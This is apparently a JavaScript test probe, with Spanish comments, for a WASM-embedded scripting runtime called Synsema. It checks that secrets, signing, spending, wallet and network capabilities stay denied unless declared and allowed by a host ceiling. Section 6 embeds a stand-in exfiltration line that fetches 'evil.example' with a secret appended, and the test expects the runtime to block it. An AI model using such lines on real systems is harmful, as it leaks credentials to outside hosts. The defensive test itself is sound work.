// Sonda viva del artefacto embebible, parte "cotidiana": lo que una app anfitriona hace
// con datos sensibles y valor, no sólo con agentes. Corre por la API (no la CLI):
//   node tests/wasm_everyday.probe.mjs [ruta/al/synsema_wasm_web.wasm]
//
// Cubre:
//  1. secretos: `env` del request → `secret()`, jamás se imprime/serializa, `reveal` gateado;
//  2. quién arregla cada denegación: sin `require` → "add require"; declarado pero sobre el
//     techo → "the host must widen the ceiling" (nunca el mismo texto para ambos);
//  3. el audit distingue `origin: program|runtime` y unifica el `reason` del techo;
//  4. firma (secp256k1) — deny-by-default, con `require sign("KEY")` + techo que lo presta
//     firma y verifica; `sandbox` adentro la deniega;
//  5. gasto (`spend`) y custodia (`wallet`) — deny-by-default, bajo techo, con scope;
//  6. red ACOTADA por el host: el hook `http` sólo responde a un host; lo demás lo frena el
//     techo ANTES de llegar al transporte (ningún byte sale);
//  7. kv del host para memoria + handler-mode con `expect`/auth (400/401 como datos);
//  8. sin traps: loop infinito, recursión y JSON gigante terminan como errores/datos.
// Cualquier aserción fallida termina con exit 1.

import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { Synsema } from "../packages/synsema-wasm/index.mjs";

const here = dirname(fileURLToPath(import.meta.url));
const root = resolve(here, "..");
const wasmPath = process.argv[2] ?? resolve(root, "engine/target/wasm32-unknown-unknown/wasm/synsema_wasm_web.wasm");

let failures = 0;
function check(name, cond, detail) {
  if (cond) console.log(`  ok  ${name}`);
  else {
    failures++;
    console.log(`FAIL  ${name}${detail !== undefined ? " — " + JSON.stringify(detail).slice(0, 700) : ""}`);
  }
}
const KEY = "0000000000000000000000000000000000000000000000000000000000000001";
const syn = await Synsema.load(wasmPath);
await syn.ready();
console.log(`== synsema-wasm-web ${syn.version()} — everyday probe`);

// 1. Secretos.
{
  const r = syn.run(`require secret("STRIPE_KEY")\nlet k be secret("STRIPE_KEY")\nprint(k)\nprint(json_encode({"k": k}))\nprint(type_of(k))\nprint(text(k))`, { env: { STRIPE_KEY: "sk_live_SECRETO" } });
  const joined = r.output.join("\n");
  check("secret nunca se imprime ni serializa", r.ok && !joined.includes("SECRETO"), r);
  check("secret sigue siendo un secret al pasar por text()", joined.includes("secret"), r.output);
  const rv = syn.run(`require secret("STRIPE_KEY")\nprint(reveal(secret("STRIPE_KEY")))`, { env: { STRIPE_KEY: "x" } });
  check("reveal sin `require reveal` → denegado con la línea a agregar", !rv.ok && rv.errors[0].includes("reveal() not permitted") && rv.errors[0].includes("require reveal"), rv);
  const rc = syn.run(`require secret("STRIPE_KEY")\nlet k be secret("STRIPE_KEY")\nprint(k == "sk_live_SECRETO")\nprint(verify_hmac("m", hmac_sha256("m", k), k))`, { env: { STRIPE_KEY: "sk_live_SECRETO" } });
  check("comparar y firmar con un secret (constant-time) funciona sin revelarlo", rc.ok && rc.output[0] === "true" && rc.output[1] === "true", rc);
  const rs = syn.run(`require secret("STRIPE_KEY")\nsandbox\n    print(type_of(secret("STRIPE_KEY")))`, { env: { STRIPE_KEY: "x" } });
  check("sandbox: adentro el secret está denegado", !rs.ok && rs.errors[0].includes("secret"), rs);
}

// 2 + 3. Quién arregla qué, y el audit.
{
  const a = syn.run(`print(secret("STRIPE_KEY"))`, { env: { STRIPE_KEY: "x" }, ceiling: "stdout,secret=STRIPE_KEY" });
  check("A: sin require → el programa lo arregla (add `require`)", !a.ok && a.errors[0].includes("missing capability") && a.errors[0].includes("add `require secret(\"STRIPE_KEY\")`"), a);
  const b = syn.run(`require secret("STRIPE_KEY")\nprint(secret("STRIPE_KEY"))`, { env: { STRIPE_KEY: "x" }, ceiling: "stdout" });
  check("B: declarado pero sobre el techo → el HOST lo arregla", !b.ok && b.errors[0].includes("above the host ceiling") && b.errors[0].includes("host must widen") && !b.errors[0].includes("add `require"), b);
  const bAudit = b.audit;
  const prog = bAudit.filter((e) => e.capability.includes("STRIPE_KEY"));
  check("audit: la denegación del programa lleva origin=program", prog.length >= 1 && prog.every((e) => e.origin === "program" && !e.granted), bAudit);
  const ambient = bAudit.filter((e) => e.origin === "runtime");
  check("audit: los grants ambientales rechazados por el techo llevan origin=runtime (time/llm)", ambient.length >= 1 && ambient.every((e) => e.source === "ceiling" && e.reason === "above host ceiling (--sandbox/--cap-set)"), bAudit);
  check("audit: el reason del techo es uno solo (misma grafía en grant y en check)", bAudit.filter((e) => /ceiling/i.test(e.reason)).every((e) => e.reason === "above host ceiling (--sandbox/--cap-set)"), bAudit);
  const c = syn.run(`require net("evil.example")\nlet r be fetch("https://evil.example/x")\nprint(r)`, { ceiling: "stdout", host: { http: () => ({ status: 200, headers: [], body: "LEAK" }) } });
  check("C: net declarado sobre el techo → mismo mensaje de host, no de programa", !c.ok && c.errors[0].includes("above the host ceiling") && !c.errors[0].includes("add `require"), c);
  const d = syn.run(`let r be fetch("https://evil.example/x")\nprint(r)`, { host: { http: () => ({ status: 200, headers: [], body: "LEAK" }) } });
  check("D: net sin require → 'Capability not granted' sin hablar del techo", !d.ok && d.errors[0].includes("Capability not granted: net") && !d.errors[0].includes("ceiling"), d);
  const na = d.audit.find((e) => e.capability.includes("net"));
  check("audit: sin require → reason 'No matching grant found', origin=program", na && na.reason === "No matching grant found" && na.origin === "program", d.audit);
}

// 4. Firma. El audit fail-loud va al kv del host (namespace `audit`).
const auditStore = new Map();
const auditKv = { get: (ns, k) => auditStore.get(ns + "\0" + k) ?? null, set: (ns, k, v) => { auditStore.set(ns + "\0" + k, v); }, delete: (ns, k) => { auditStore.delete(ns + "\0" + k); }, list: (ns) => [] };
{
  const noReq = syn.run(`require secret("ETH_KEY")\nlet d be keccak256("hola")\nprint(length(secp256k1_sign(d, secret("ETH_KEY"))))`, { env: { ETH_KEY: KEY }, host: { kv: {} } });
  check("sign sin `require sign` → denegado y dice qué agregar", !noReq.ok && noReq.errors[0].includes("sign") && noReq.errors[0].includes("require sign"), noReq);
  const ceil = syn.run(`require secret("ETH_KEY")\nrequire sign("ETH_KEY")\nlet d be keccak256("hola")\nprint(length(secp256k1_sign(d, secret("ETH_KEY"))))`, { env: { ETH_KEY: KEY }, ceiling: "stdout,secret=ETH_KEY", host: { kv: {} } });
  check("sign declarado pero el techo no lo presta → denegado y apunta al host", !ceil.ok && ceil.errors[0].includes("above the host ceiling") && !ceil.errors[0].includes("add `require"), ceil);
  console.log("      (mensaje sign bajo techo) " + (ceil.errors[0] || "").slice(0, 160));
  const ok = syn.run(`require secret("ETH_KEY")\nrequire sign("ETH_KEY")\nlet d be keccak256("hola")\nlet sig be secp256k1_sign(d, secret("ETH_KEY"))\nprint(length(sig))\nprint(secp256k1_verify(d, sig, secp256k1_pubkey(secret("ETH_KEY"))))\nprint(eth_address(secret("ETH_KEY")))`, { env: { ETH_KEY: KEY }, ceiling: "stdout,secret=ETH_KEY,sign=ETH_KEY", host: { kv: auditKv } });
  check("audit fail-loud: la firma quedó en el kv del host (sign.log), sin material", auditStore.has("audit\0sign.log") && /result=granted/.test(auditStore.get("audit\0sign.log")) && !auditStore.get("audit\0sign.log").includes(KEY), [...auditStore.entries()]);
  const noSink = syn.run(`require secret("ETH_KEY")\nrequire sign("ETH_KEY")\nprint(length(secp256k1_sign(keccak256("x"), secret("ETH_KEY"))))`, { env: { ETH_KEY: KEY }, ceiling: "stdout,secret=ETH_KEY,sign=ETH_KEY" });
  check("sin kv del host no hay sink de audit → no se firma y el error lo dice (no habla de SYNSEMA_AUDIT_DIR)", !noSink.ok && noSink.errors[0].includes("no audit sink") && !noSink.errors[0].includes("SYNSEMA_AUDIT_DIR"), noSink);
  check("sign con require + techo que lo presta → firma 65 bytes, verifica, dirección determinista", ok.ok && ok.output[0] === "65" && ok.output[1] === "true" && ok.output[2].toLowerCase() === "0x7e5f4552091a69125d5dfcb7b8c2659029395bdf", ok);
  check("audit: la firma concedida figura con origin=program", ok.audit.some((e) => e.capability.startsWith("sign") && e.granted && e.origin === "program"), ok.audit);
  const sb = syn.run(`require secret("ETH_KEY")\nrequire sign("ETH_KEY")\nlet d be keccak256("hola")\nsandbox\n    print(length(secp256k1_sign(d, secret("ETH_KEY"))))`, { env: { ETH_KEY: KEY }, ceiling: "stdout,secret=ETH_KEY,sign=ETH_KEY", host: { kv: auditKv } });
  check("sandbox: adentro no se firma aunque esté concedido afuera", !sb.ok, sb);
  const wrongKey = syn.run(`require secret("OTHER")\nrequire sign("ETH_KEY")\nlet d be keccak256("hola")\nprint(length(secp256k1_sign(d, secret("OTHER"))))`, { env: { OTHER: KEY }, ceiling: "stdout,secret=OTHER,sign=ETH_KEY", host: { kv: auditKv } });
  check("sign scoped a ETH_KEY no firma con OTHER (scope por nombre del secret)", !wrongKey.ok, wrongKey);
}

// 5. Gasto y custodia.
{
  const s0 = syn.run(`print(spend(10, "USD", "test"))`);
  check("spend sin require → denegado con la línea a agregar", !s0.ok && s0.errors[0].includes("spend") && s0.errors[0].includes("require spend"), s0);
  const s1 = syn.run(`require spend("USD")\nspend(10, "USD", "order 1")\nspend(5, "USD", "order 2")\nprint(spend_total("USD"))`, { ceiling: "stdout,spend=USD", host: { kv: auditKv } });
  check("audit fail-loud: los gastos quedaron en el kv del host (spend.log)", auditStore.has("audit\0spend.log") && (auditStore.get("audit\0spend.log").match(/result=granted/g) || []).length === 2, auditStore.get("audit\0spend.log"));
  check("spend con require + techo → registra y suma", s1.ok && s1.output[0] === "15", s1);
  const s2 = syn.run(`require spend("USD")\nspend(10, "USD", "x")`, { ceiling: "stdout", host: { kv: auditKv } });
  check("spend declarado sobre el techo → denegado y apunta al host", !s2.ok && s2.errors[0].includes("above the host ceiling") && !s2.errors[0].includes("add `require"), s2);
  console.log("      (mensaje spend bajo techo) " + (s2.errors[0] || "").slice(0, 160));
  const s3 = syn.run(`require spend("USD")\nspend(10, "EUR", "x")`, { ceiling: "stdout,spend=USD", host: { kv: auditKv } });
  check("spend en otra unidad que la declarada → denegado", !s3.ok, s3);
  const w0 = syn.run(`require random\nprint(mnemonic_generate())`, { ceiling: "stdout,random" });
  check("wallet sin require → denegado y dice qué agregar", !w0.ok && w0.errors[0].includes("wallet") && w0.errors[0].includes("require wallet"), w0);
  const w1 = syn.run(`require random\nrequire wallet("mnemonic*")\nlet m be mnemonic_generate()\nprint(type_of(m))\nlet seed be mnemonic_to_seed(m, as_secret("", "pp"))\nlet k be hd_derive(seed, "m/44'/60'/0'/0/0")\nprint(type_of(k))\nprint(starts_with(eth_address(k), "0x"))`, { ceiling: "stdout,random,wallet=mnemonic*", host: { kv: auditKv } });
  check("wallet con require + techo → mnemónico/seed/clave son secrets, dirección derivable", w1.ok && w1.output[0] === "secret" && w1.output[1] === "secret" && w1.output[2] === "true", w1);
}

// 6. Red acotada por el host: el hook sólo conoce api.interna; lo demás lo frena el techo.
{
  const seen = [];
  const http = (req) => { seen.push(req.url); return req.url.startsWith("https://api.interna/") ? { status: 200, headers: [["content-type", "application/json"]], body: '{"saldo": 42}' } : { status: 502, headers: [], body: "no" }; };
  const host = { http };
  const okRun = syn.run(`require net("api.interna")\nlet r be fetch("https://api.interna/cuenta")\nprint(r["status"])\nprint(json_decode(r["body"])["saldo"])`, { host, ceiling: "stdout,net=api.interna" });
  check("host http acotado: la URL permitida llega al hook y vuelve parseable", okRun.ok && okRun.output[0] === "200" && okRun.output[1] === "42", okRun);
  const exfil = syn.run(`require net("evil.example")\nrequire secret("STRIPE_KEY")\nlet r be fetch("https://evil.example/?k=" + text(secret("STRIPE_KEY")))\nprint(r["status"])`, { host, env: { STRIPE_KEY: "sk" }, ceiling: "stdout,net=api.interna,secret=STRIPE_KEY" });
  check("exfiltración: el techo la frena y NINGÚN byte llega al hook http", !exfil.ok && seen.every((u) => u.startsWith("https://api.interna/")), { errors: exfil.errors, seen });
  check("exfiltración: el error dice que es el host quien decide", exfil.errors[0].includes("above the host ceiling"), exfil.errors);
  const tried = exfil.audit.filter((e) => e.capability.includes("evil.example") && !e.granted && e.origin === "program");
  check("exfiltración: el intento queda en el audit como origin=program", tried.length >= 1, exfil.audit);
  const undeclared = syn.run(`let r be fetch("https://api.interna/cuenta")\nprint(r)`, { host });
  check("host ofrece http pero el programa no declaró net → denegado igual", !undeclared.ok && undeclared.errors[0].includes("Capability not granted: net"), undeclared);
}

// 7. kv + handler-mode con datos.
{
  const store = new Map();
  const kv = { get: (ns, k) => store.get(ns + "\0" + k) ?? null, set: (ns, k, v) => { store.set(ns + "\0" + k, v); }, delete: (ns, k) => { store.delete(ns + "\0" + k); }, list: (ns) => [...store.keys()].filter((x) => x.startsWith(ns + "\0")).map((x) => x.slice(ns.length + 1)) };
  const app = `require serve(1)\nrequire secret("ADMIN_TOKEN")\ntask auth(token)\n    give when secret("ADMIN_TOKEN") == token then {"role": "admin"} otherwise nothing\nserve on 1\n    auth with auth\n    route "POST /orders" requires auth\n        expect body {sku: text, qty: number}\n        let b be json of request\n        state_set("last", b["sku"])\n        give created({"ok": true})\n    route "GET /last"\n        give {"last": state_get("last")}`;
  const opts = { host: { kv }, env: { ADMIN_TOKEN: "t0k" } };
  const noAuth = syn.handle(app, { method: "POST", path: "/orders", headers: [["content-type", "application/json"]], body: '{"sku": "A", "qty": 1}' }, opts);
  check("handler: sin bearer → 401 como dato", noAuth.status === 401, noAuth);
  const bad = syn.handle(app, { method: "POST", path: "/orders", headers: [["authorization", "Bearer t0k"], ["content-type", "application/json"]], body: '{"sku": "A"}' }, opts);
  check("handler: body que no cumple expect → 400 con el campo", bad.status === 400 && bad.body.includes("qty"), bad);
  const good = syn.handle(app, { method: "POST", path: "/orders", headers: [["authorization", "Bearer t0k"], ["content-type", "application/json"]], body: '{"sku": "A", "qty": 2}' }, opts);
  check("handler: request válida → 201", good.status === 201, good);
  const last = syn.handle(app, { method: "GET", path: "/last" }, opts);
  check("handler: state_* durable vía kv entre requests", last.status === 200 && last.body.includes('"A"'), last);
  check("handler: el token del admin no aparece en ninguna respuesta", ![noAuth, bad, good, last].some((r) => JSON.stringify(r).includes("t0k")), null);
}

// 8. Sin traps.
{
  const loop = syn.run("let i be 0\nwhile true\n    set i to i + 1\nprint(i)");
  check("loop infinito → error de límite de iteraciones, no trap", !loop.ok && /iterations|Loop/i.test(loop.errors[0]), loop);
  const rec = syn.run("task f(n)\n    give f(n + 1)\nprint(f(0))");
  check("recursión sin fin → error, no trap", !rec.ok && rec.errors.length === 1, rec);
  const big = syn.run('let xs be range(200000)\nprint(length(json_encode(xs)) > 1000000)');
  check("JSON grande → funciona (o falla como dato), sin trap", big.ok ? big.output[0] === "true" : big.errors.length === 1, big);
  const after = syn.run("print(1 + 1)");
  check("la instancia sigue sana después de los errores", after.ok && after.output[0] === "2", after);
}

console.log(failures ? `\n${failures} FAIL` : "\nall ok");
process.exit(failures ? 1 : 0);
